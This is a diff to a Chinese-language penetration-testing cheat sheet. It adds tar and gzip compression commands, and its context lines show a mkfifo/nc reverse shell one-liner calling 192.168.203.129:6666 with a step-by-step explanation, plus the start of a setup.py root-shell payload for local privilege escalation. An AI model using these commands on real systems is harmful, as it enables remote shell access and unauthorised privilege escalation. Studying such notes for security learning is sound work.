@@ -147,6 +147,16 @@ ssh相比反弹shell更稳定，ssh流量加密
 ## 2.10 su
 `su [用户名]`切换到指定用户（保留当前的环境变量）
 `su - [用户名]`切换用户，且完全加载目标用户的环境
+
+## 2.11 压缩解压
+### 2.11.1 tar
+压缩：`tar -cvf 文件名.tar file1 file2 dir1`
+解压：`tar -xvf 文件名.tar`
+
+### 2.11.2 gzip
+压缩：`gzip 文件名`
+解压：`gunzip 文件名.gz`
+
 # 三、渗透工具
 ## 3.1 arp-scan
 `sudo arp-scan -l`
@@ -429,7 +439,7 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.203.129 6666
   - 第二步（发送流）：`nc IP PORT > /tmp/f`shell执行后的结果（例如`ls`）通过管道交给`nc`，`nc`发送到攻击机
   - 第三步（输入流）：`nc`接收到的攻击者输入的指令，通过`> /tmp/f`重定向回管道中
   - 三步循环
-  
+
 ## 4.2 交互式root shell绑定(本地提权)
 ```ZSH
 echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > setup.py
